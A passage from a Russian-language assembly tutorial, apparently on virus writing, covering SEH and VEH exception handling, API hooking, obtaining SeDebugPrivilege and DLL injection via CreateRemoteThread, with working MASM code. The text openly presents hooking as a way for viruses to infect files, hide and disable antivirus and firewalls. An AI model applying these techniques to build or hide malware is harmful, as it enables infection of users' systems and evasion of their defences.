&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>PrevEsp<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>regEsp<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>PrevEbp<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>regEbp<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke MessageBox<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>offset seh<span style="color: #339933;">,</span>offset seh<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>ExceptionContinueExecution<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
SEHHandler endp<br />
end <span style="color: #0000ff; font-weight: bold;">start</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>В начале программы, в стеке создается SEH-фрейм. По адресу FS:[0] передается указатель на этот SEH-фрейм. Помимо смещения обработчика и адреса предыдущего SEH-фрейма мы передаем смещение безопасного места, значение ESP и EBP. Т.о. мы заполняем все поля структуры SEH. Если происходит исключение, то управление передается обработчику исключений SEHHandler. Обработчик исключений, используя переданную ему структуру SEH заполняет некоторые поля структуры CONTEXT, а именно регистры ESP(для сохранения вершины стека), EBP(для доступа к локальным данным), EIP(для перехода на безопасное место). Обработчик возвращает 1 или константу ExceptionContinueExecution, чтобы сообщить операционной системе, что обработчик обработал исключение и необходимо продолжить выполнение программы в контексте указанной в структуре CONTEXT.</p>
<p>Финальный обработчик</p>
<p>В финальном обработчике также можно перезагружать контекст таким образом, чтобы выполнение продолжалось с безопасного места. Но если мы хотим продолжить выполнение программы возвращать обработчик должен уже не 1, а -1. Финальному обработчику в отличие от внутри-поточного передается только структуры CONTEXT, EXCEPTION_RECORD, а структура SEH не передается, поэтому значения регистров EIP, EBP, ESP надо хранить в статической памяти или что-либо подобное, например в куче.</p>
<h4><a name="c415"></a>Заключение</h4>
<p>SEH также используют для переполнения стека или переполнения кучи, с помощью подмены обработчика. Это уже штучки создателей эксплойтов - отдельное сообщество компьютерного андеграунда, так же как и вирмейкеры. Очень хорошо, когда сообщества объединяются или комбинируются. Остальную информация о SEH - такую как - "раскрутка стека", "информация, которая передается обработчику", и т.д. можно прочитать в статье Джереми Гордона.</p>
<h3><a name="c42"></a>Vectored Exception Handling (VEH)</h3>
<p>VEH - или векторная обработка исключений - относительно новый механизм обработки исключений. Он появился впервые в операционной системе Windows XP. Вы, наверное, испугались названия, но не бойтесь, использовать VEH очень просто.</p>
<p>VEH это тоже самое, что и SEH - также устанавливаются обработчики исключений. Но в этих механизмах есть несколько различий. Во-первых, никаких служебных слов типа try, except, finally для С++, как раньше, нет.  Т.е. это не надстройка компилятора. Во-вторых, и это очень важно - VEH это не stack-frame based механизм. Т.е. раньше все SEH-фреймы были в стеке. Теперь же узлы VEH'а находятся в куче. В-третьих, VEH обработчики глобальны для процесса. Из VEH обработчиков можно делать цепочки.</p>
<p>Можно сравнить VEH с финальными обработчиками UnhandledExceptionFilter из которых можно делать цепочки. Различие с финальным обработчиком и в том, что векторный обработчик вызывается в первую очередь(т.е. до SEH), а финальный в последнюю.</p>
<p>Чтобы установить векторный обработчик мы вызываем функцию AddVectoredExceptionFilter. Вот ее прототип:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">PVOID AddVectoredExceptionHandler<span style="color: black;">&#40;</span><br />
&nbsp; ULONG FirstHandler<span style="color: #339933;">,</span><br />
&nbsp; PVECTORED_EXCEPTION_HANDLER VectoredHandler<br />
<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp;</div>
<p>FirstHandler - если этот параметр не ноль, то обработчик устанавливается, как следующий элемент в цепочке. Т.е. при возникновении исключения именно он вызовется ОС. Если этот параметр ноль, то обработчик устанавливается в начало цепочки и вызывается в том случае, если все остальные обработчики в цепочке не обрабатывают исключение, т.е. возвращают EXCEPTION_CONTINUE_SEARCH.</p>
<p>Огромным преимуществом VEH'а над SEH'ом в том, что он отлавливает абсолютно все исключения для всех потоков. А вот у SEH'а с этим проблемы.</p>
<p>Пример использования VEH'а:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Handler<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;В EBP - дельта-смещение</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>_AddVectoredExceptionHandler<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;защищенный код</span><br />
Handler proc Record<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;обработчик </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;обработка исключения</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Проход дальше по цепочке</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span> <br />
Handler endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<h4><a name="c421"></a>VEH изнутри</h4>
<p>Я попытался исследовать VEH изнутри. Что из этого получилось, описано в этом разделе.</p>
<p>В модуле NTDLL.DLL есть
статическая глобальная переменная. Назовем её CurrentVEHFrame. В этой переменной содержится адрес текущего VEH-фрейма. При вызове функции AddVectoredExceptionHandler в куче создается новый VEH-фрейм и заполняется соответствующими значениями. VEH-фреймом я называю структуру, которая определена следующим образом</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">VEH struct<br />
&nbsp; &nbsp; &nbsp; &nbsp; Prev&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; pСurrentVEHFrame &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; EncodeVEHHandler&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br />
VEH ends<br />
&nbsp;</div>
<p>Prev - адрес в куче предыдущего VEH-фрейма. Если это самый последний фрейм, то его значение равно значению адреса переменной CurrentVEHFrame.</p>
<p>pСurrentVEHFrame - адрес переменной CurrentVEHFrame</p>
<p>EncodeVEHHandler - закодированный адрес обработчика. Чтобы получить виртуальный адрес обработчика необходимо вызвать функцию RtlDecodePointer библиотеки NTDLL(можно написать так: NTDLL!RtlDecodePointer).</p>
<p>Т.о. при  вызове функции AddVectoredExceptionHandler в цепочку векторных обработчиков добавляется новый элемент. Цепочка представляет связанный список. Вот рисунок, который иллюстрирует сказанное:</p>
<div align="center">
	<img src="img/vbp01/fig33.gif" alt="" />
</div>
<p>Здесь при возникновении исключения будет вызван обработчик Handler1. Если он не обрабатывает исключение, то управление передается обработчику, следующему в цепочке. Еще раз повторю, что ОС определяет, что обработчик является последним в цепочке, если pCurrentVEHFrame==Prev. Это показано на рисунке.</p>
<h3><a name="c43"></a>Перехват вызовов функций</h3>
<h4><a name="c431"></a>Общая картина</h4>
<p>Перехват вызовов функций называется также "Per-process residency" техника, применяемая в операционных системах Windows. С ОС Windows поставляются файлы с расширением DLL - Dinamic Link Library. Это библиотеки динамической компоновки. Они экспортируют функции, чтобы их могли  вызвать другие приложения или DLL. Чтобы приложение могло использовать какие-то сервисы ОС, оно должно вызвать одну из функций, которая экспортируются системной DLL. Все функции ОС хранятся в системных DLL. Функции, которые являются посредниками между ОС и приложением называются API (Application Programming Interface)-функциями. Соль механизма перехвата функций состоит в следующем. Когда приложение вызывает API-функцию мы можем вместо оригинальной функции вызвать свою функцию, которая может изменить результат вызова для приложения-жертвы (для того приложения, в котором мы перехватываем функции). Т.о. мы можем изменять логику работы любого приложения. Т.е. любое обращение программы к ОС мы можем контролировать, изменять или просто наблюдать за работой какого-то приложения. Мы можем понять, как работает та или иная программа по функциям, которая она вызывает. И этот способ контроля будет значительно проще для анализа, чем простая отладка. Тем более некоторые программы используют анти-отладочные механизмы. Некоторые операции в ОС Windows вообще нельзя осуществить без помощи перехвата API-функций. Перехватывать можно не только API-функции, но и любые экспортируемые функции.</p>
<p>В вирусологии техника перехвата особенно полезна. Она используется для продвинутого заражения файлов, полезной нагрузки, получения информации нужной вирусу (например, путь к файлу для заражения), скрытия присутствия, уничтожения или нарушения работы ненужных нам программ (антивирусов и брандмауэров).</p>
<p>В адресное пространство любого процесса загружена библиотека NTDLL.DLL. При вызове функций из kernel32.dll, например, OpenProcess в конечном итоге вызывается функция ZwOpenProcess, которая находиться в NTDLL.DLL. Низкоуровневые функции, которые находятся в NTDLL.DLL называются NativeAPI функции. Лучше перехватывать именно их, чтобы процесс жертва не смог отделаться от перехвата даже с помощью вызова Native API. Можно и просто исправить перехват. Но чтобы и этого не случилось, необходим перехват в нулевом кольце. Здесь мы будем заниматься только третьим кольцом.</p>
<h4><a name="c432"></a>Привилегии</h4>
<p>Перехват вызовов функций делается при помощи некоторого механизма. Этот механизм применим для одного конкретного процесса. Если мы хотим глобализировать наш перехват, то мы должны применить технику перехвата для всех процессов в системе. Но по умолчанию даже пользователь с привилегиями администратора не имеет возможности получить доступ к системным процессам (например, winlogon.exe). Чтобы перехватывать функции и в системных процессах необходим доступ к этим системным процессам. Вообще, для внедрения кода в удаленный процесс (а это один из важных шагов механизма перехвата) необходимы следующие привилегии:</p>
<ul>
	<li>PROCESS_CREATE_THREAD - для создания потока в удаленном процессе</li>
	<li>PROCESS_VM_WRITE - для записи в память удаленного процесса</li>
	<li>PROCESS_VM_OPERATION - для операций типа изменения прав доступа к памяти (protect и lock).</li>
</ul>
<p>Чтобы открыть системный процесс с такими привилегиями, вызывающий функцию KERNEL32.DLL!OpenProcess должен иметь привилегию SeDebugPrivilegies. Ниже представлена процедура на ассемблере получения данной привилегии:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">EnableDebugPrivilege proc<br />
LOCAL hToken<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL tkp<span style="color: #339933;">:</span>TOKEN_PRIVILEGES<br />
LOCAL ReturnLength<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL luid<span style="color: #339933;">:</span>LUID<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke OpenProcessToken<span style="color: #339933;">,</span>INVALID_HANDLE_VALUE<span style="color: #339933;">,</span> TOKEN_ADJUST_PRIVILEGES <span style="color: #00007f; font-weight: bold;">or</span> TOKEN_QUERY<span style="color: #339933;">,</span>ADDR hToken<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke LookupPrivilegeValue<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>offset Priv<span style="color: #339933;">,</span>ADDR luid<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hToken<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> tkp<span style="color: #339933;">.</span>PrivilegeCount<span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>tkp<span style="color: #339933;">.</span>Privileges<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">:</span>ptr LUID_AND_ATTRIBUTES<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> luid<span style="color: #339933;">.</span>LowPart<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Luid<span style="color: #339933;">.</span>LowPart<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> luid<span style="color: #339933;">.</span>HighPart<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Luid<span style="color: #339933;">.</span>HighPart<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Attributes<span style="color: #339933;">,</span>SE_PRIVILEGE_ENABLED<br />
&nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke AdjustTokenPrivileges<span style="color: #339933;">,</span>hToken<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>ADDR tkp<span style="color: #339933;">,</span>sizeof tkp<span style="color: #339933;">,</span>ADDR tkp<span style="color: #339933;">,</span>ADDR ReturnLength<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetLastError<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">eax</span>!=ERROR_SUCCESS<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
EnableDebugPrivilege endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Здесь Priv - это строка определенная так:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Priv <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;SeDebugPrivilege&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span></div>
<p>После вызова данной функции вызывающий ее процесс может открывать системные процессы.</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> EnableDebugPrivilege<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ProcID<span style="color: black; font-style: italic;">;ID системного процесса </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> PROCESS_CREATE_THREAD <span style="color: #00007f; font-weight: bold;">or</span> PROCESS_VM_WRITE <span style="color: #00007f; font-weight: bold;">or</span> PROCESS_VM_OPERATION<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> OpenProcess<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>GetLastError вернет ERROR_SUCCESS. Если открыть системный процесс без вызова функции EnableDebugPrivilege, то OpenProcess вернет ноль, а GetLastError вернет ERROR_ACCESSDENIED.</p>
<h3><a name="c44"></a>Dinamic Link Library</h3>
<h4><a name="c441"></a>Общая картина</h4>
<p>Чтобы перехватить функцию в каком-нибудь процессе необходимо выполнить код в этом процессе. Изначально этот код не содержится в этом процессе. Т.е. его необходимо туда поместить. Для этого есть два способа: 1) Внедрение кода с помощью DLL. 2) Простое копирование кода в шел-код стиле. Большинство методов перехвата API функций используют внедрение кода с помощью DLL, т.к. при этом нет требования базовой независимости и зависимости от адресов API-функций. В случае вируса нам желательно не создавать никаких DLL, хотя нет никаких проблем, если мы создадим ее. При этом есть ограничение - это размер кода, который будет внедрен в жертву при заражении. Как создавать код в шел-код стиле мы уже знаем, теперь рассмотрим как создать DLL.</p>
<p>DLL - это обычный PE-файл, в котором есть соответствующий флаг поля Characteristics файлового заголовка. В EXE-файле не может быть этого флага. Если в EXE файле стоит флаг DLL, то он считается некорректным. DLL - это обычно набор функций, которые экспортируются другими модулями. У DLL, как и у любого EXE файла есть точка входа. Для DLL точка входа указывает на функцию, которую условно можно назвать DLLMain. Вот её прототип:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">DllMain proc hInstDLL<span style="color: #339933;">:</span>HINSTANCE<span style="color: #339933;">,</span> reason<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> reserved1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span></div>
<p>hInstDLL - описатель данной DLL</p>
<p>Эта функция вызывается при определенных событиях. В результате какого события была вызвана функция DLL указано в параметре reason.</p>
<p>Вот его возможные значения и их описание:</p>
<ul>
	<li>DLL_PROCESS_ATTACH - DLL получает это значение, когда впеpвые загpужается в адpесное пpостpанство пpоцесса. Вы можете использовать эту возможность для того, чтобы осуществить инициализацию. При этом значении мы устанавливаем перехватчик.</li>
	<li>DLL_PROCESS_DETACH - DLL получает это значение, когда выгpужается из адpесного пpостpанства пpоцесса. Вы можете использовать эту возможность для того, чтобы "почистить" за собой: освободить память и так далее.</li>
	<li>DLL_THREAD_ATTACH - DLL получает это значение, когда пpоцесс создает новый поток.</li>
	<li>DLL_THREAD_DETACH - DLL получает это значение, когда поток в процессе был уничтожен.</li>
</ul>
<h3><a name="c45"></a>Создание DLL</h3>
<p>Создание DLL мало отличается от создания EXE. Вот код самой простой DLL:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;----------------------------------------------------------------------------</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DLL.asm</span><br />
<span style="color: black; font-style: italic;">;----------------------------------------------------------------------------</span><br />
<span style="color: #ff0000;">.386</span><br />
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall<br />
option casemap<span style="color: #339933;">:</span>none<br />
include \masm32\include\windows<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
include \masm32\include\user32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
include \masm32\include\kernel32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
<br />
includelib \masm32\lib\user32<span style="color: #339933;">.</span>lib<br />
includelib \masm32\lib\kernel32<span style="color: #339933;">.</span>lib<br />
<br />
<span style="color: #0000ff; font-weight: bold;">.data</span><br />
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br />
DllMain proc hInstDLL<span style="color: #339933;">:</span>HINSTANCE<span style="color: #339933;">,</span> reason<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> reserved1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if reason==DLL_PROCESS_ATTACH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;код</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>elseif reason==DLL_PROCESS_DETACH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;код</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>elseif reason==DLL_THREAD_ATTACH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;код</span><br />
<span style="color: #339933;">.</span>else &nbsp; &nbsp;<span style="color: black; font-style: italic;">; DLL_THREAD_DETACH</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;код</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>TRUE<br />
<span style="color: #00007f; font-weight: bold;">ret</span><br />
DllMain Endp<br />
<br />
TestFunction proc<span style="color: black; font-style: italic;">;Функция, которая ничего не делает, но экспортируется</span><br />
<span style="color: #00007f; font-weight: bold;">ret</span><br />
TestFunction endp<br />
end DllMain<br />
<span style="color: black; font-style: italic;">;----------------------------------------------------------------------------</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Также необходимо создать файл с расширением DEF, который должен быть примерно такого вида:</p>
<p>Пример:</p>
<pre class="source">
;----------------------------------------------------------------------------
;				DLL.def
;----------------------------------------------------------------------------
LIBRARY DLL
EXPORTS TestFunction
;----------------------------------------------------------------------------
</pre>
<p>Пример Закончен.</p>
<p>Где LIBRARY - имя библиотеки, EXPORTS - имя функции, которая экспортируется из DLL (EXPORTS может быть несколько). Необходимо при вызове DLLMain сохранять регистры esi,edi,ebx,ebp и восстанавливать их при выходе из DllMain.</p>
<p>Для компиляции DLL нужно создать как обычно объектный файл, а для линковки используйте следующую строку:</p>
<p>link /DLL /SUBSYSTEM:WINDOWS /DEF:DLL.def DLLSkeleton.obj</p>
<p>Видите, ключ /DLL указывает на установку флага DLL в файловом заголовке.</p>
<h4><a name="c451"></a>Внедрение и исполнение удаленного кода</h4>
<p>Внедрить DLL в адресное пространство постороннего процесса можно несколькими способами. А именно: с помощью реестра, с помощью хуков, с помощью удаленных потоков, с помощью замены оригинальной DLL, а также DLL можно внедрить как отладчик или через функцию KERNEL32.DLL!CreateProcess. Все эти способы описаны в книгe Джеффри Рихтера "Windows для профессионалов". Можно также и даже проще внедрить просто посторонний код в чужой процесс. Хотя в этом случая потребуется время на его создание. Но мы-то с Вами знаем теперь как делать такой код.</p>
<p>Я буду использовать метод внедрения DLL с помощью удаленных потоков, т.к. он является самым гибким. Но вы можете использовать любой другой. Это совершенно не принципиально, главное чтобы внедрение происходило правильно и в нужные приложения. Методы внедрения, конечно, отличаются друг от друга и налагают некоторые ограничения.</p>
<p>Windows предоставляет функцию, которая называется KERNEL32.DLL!CreateRemoteThread. Она позволяет создать новый поток внутри удаленного процесса. Мы заставляем вызвать функцию KERNEL32.DLL!LoadLibrary потоком целевого процесса для загрузки нужной DLL. Одним из параметров функции KERNEL32.DLL!CreateRemoteThread является lpStartAddress, который означает адрес процедуры потока. Процедура потока принимает один параметр. KERNEL32.DLL!LoadLibrary принимает также один параметр. Т.е. как стартовый адрес удаленного потока мы можем указать адрес функции KERNEL32.DLL!LoadLibrary. При этом мы пользуемся тем, что KERNEL32.DLL проецируется во всех виртуальных адресных пространствах по одному и тому же адресу и из этого соображения предполагаем, что в  удаленном процессе функция KERNEL32.DLL!LoadLibrary тоже находиться по тому же адресу что и в нашем процессе.</p>
<p>Еще один важный момент заключается в параметре, который передается потоку и соответственно функции LoadLibrary. Мы должны передать адрес строки с именем функции. Адрес этот должен обязательно находиться в адресном пространстве целевого процесса, т.е. мы должны скопировать эту строку туда. Выделения виртуальной памяти в удаленном процессе производиться c помощью функции KERNEL32.DLL!VirtualAllocEx. Осуществлять запись и чтение памяти чужого процесса можно с помощью функций KERNEL32.DLL!WriteProcessMemory и KERNEL32.DLL!ReadProcessMemory соответственно. Освободить выделенный регион можно с помощью функции KERNEL32.DLL!VirtualFreeEx.</p>
<p>Вот код программы с помощью, которой внедряется DLL:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;=======================================================</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; П Р О Г Р А М М А &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Внедрение DLL в адресное пространство чужого процесса &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Дата: 01.07.2005&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><br />
